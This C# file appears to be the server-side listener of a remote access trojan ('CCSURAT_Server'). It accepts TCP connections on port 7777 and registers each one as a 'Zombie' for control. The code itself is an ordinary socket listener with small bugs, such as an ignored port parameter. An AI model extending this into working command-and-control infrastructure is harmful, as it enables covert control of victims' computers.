using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace CCSURAT_Server
{
    class Listener
    {

        // Store main form for its console
        private ServerMainForm mainForm;

        private List<Zombie> zombies;

        public Listener(ServerMainForm form, List<Zombie> zombies, int port)
        {
            this.mainForm = form;
            this.zombies = zombies;
            Log("Listener initialized.");
        }

        public void Start()
        {
            try {
                Boolean isConnected = false;
                TcpListener listener = new TcpListener(IPAddress.Any, 7777);

                while (isConnected == false)
                {
                    listener.Start();

                    TcpClient client = listener.AcceptTcpClient();
                    Zombie zombie = new Zombie(mainForm, client);
                    zombies.Add(zombie);
                    //Console.Beep();
                    Thread slaveThread = new Thread(new ThreadStart(zombie.ListenForData));

                    slaveThread.Start();
                    Log("Accepted Client Connection");

                    isConnected = true;
                }
            }catch(Exception ex)
            {
                Log("Listener error: " + ex.ToString());
            }
        }

        private void Log(string s)
        {
            mainForm.Log(s);
            Console.WriteLine();
        }
    }
}
